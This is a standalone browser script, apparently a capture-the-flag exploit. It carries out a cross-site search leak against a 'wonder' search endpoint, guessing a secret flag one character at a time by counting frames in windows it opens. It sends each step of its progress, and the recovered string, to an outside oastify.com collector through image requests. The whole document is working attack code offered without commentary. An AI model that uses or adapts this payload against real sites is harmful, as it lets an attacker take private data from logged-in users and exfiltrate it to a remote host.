<script>
const BASE = "https://wonder.cbd2026.cloud";
const EXFIL = "http://lk9awzmrw79jh6kwcrcnh8scv31upsdh.oastify.com";

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-=!@#$%^&*().,:;";
const prefixes = ["CBC{", "FLAG{", "CBD{", "CTF{", "Wonder{", "wonder{"];

function leak(s) {
  new Image().src = EXFIL + "/?f=" + encodeURIComponent(s) + "&t=" + Date.now();
}

async function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

async function test(q) {
  let w = open(BASE + "/search?q=" + encodeURIComponent(q), "_blank");

  await sleep(1500);

  let ok = false;
  try {
    ok = w.frames.length > 0 || w.length > 0;
  } catch(e) {
    ok = false;
  }

  try { w.close(); } catch(e) {}

  return ok;
}

async function brute(start) {
  let flag = start;
  leak("BRUTE_START:" + flag);

  while (true) {
    let found = false;

    for (const c of charset) {
      let guess = flag + c;

      if (await test(guess)) {
        flag += c;
        leak(flag);
        found = true;

        if (c === "}") {
          leak("DONE:" + flag);
          return;
        }

        break;
      }
    }

    if (!found) {
      leak("STUCK:" + flag);
      return;
    }
  }
}

async function run() {
  leak("START");

  for (const p of prefixes) {
    let ok = await test(p);
    leak("PREFIX:" + p + ":" + ok);

    if (ok) {
      await brute(p);
      return;
    }
  }

  leak("NO_PREFIX_MATCH");
}

run();
</script>
